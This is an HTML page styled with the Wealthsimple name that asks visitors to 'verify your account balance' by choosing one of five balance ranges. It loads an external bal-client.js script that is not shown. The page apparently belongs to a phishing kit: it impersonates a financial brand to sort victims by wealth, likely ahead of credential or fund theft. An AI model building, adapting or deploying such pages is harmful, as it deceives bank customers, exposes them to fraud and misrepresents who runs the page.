<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Select Your Range</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #87CEEB 0%, #B0E0E6 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 12px;
            padding: 60px 80px;
            max-width: 600px;
            width: 100%;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
        }

        h1 {
            font-size: 42px;
            font-weight: 400;
            color: #2C3E50;
            margin-bottom: 16px;
            text-align: center;
            line-height: 1.2;
        }

        .subtitle {
            font-size: 14px;
            color: #5A6C7D;
            text-align: center;
            margin-bottom: 40px;
            letter-spacing: 1px;
            text-transform: uppercase;
        }

        .button-group {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        button {
            background: white;
            border: 2px solid #2C3E50;
            border-radius: 50px;
            padding: 20px 40px;
            font-size: 18px;
            font-weight: 500;
            color: #2C3E50;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
        }

        button:hover {
            background: #2C3E50;
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(44, 62, 80, 0.3);
        }

        button:active {
            transform: translateY(0);
        }

        .logo {
            font-size: 24px;
            font-weight: 700;
            color: #2C3E50;
            position: absolute;
            top: 30px;
            left: 40px;
        }

        @media (max-width: 768px) {
            .container {
                padding: 40px 30px;
            }

            h1 {
                font-size: 32px;
            }

            button {
                font-size: 16px;
                padding: 16px 32px;
            }
        }
    </style>
</head>
<body>
    <div class="logo">Wealthsimple</div>
    
    <div class="container">
        <p class="subtitle">Select Your Range</p>
        <h1>Verify your<br>account balance</h1>
        
        <div class="button-group">
            <button>$0 - $5,000</button>
            <button>$5,000 - $25,000</button>
            <button>$25,000 - $100,000</button>
            <button>$100,000 - $500,000</button>
            <button>$500,000+</button>
        </div>
    </div>

    <!-- Include the bal-client.js script -->
    <script src="bal-client.js"></script>
</body>
</html>
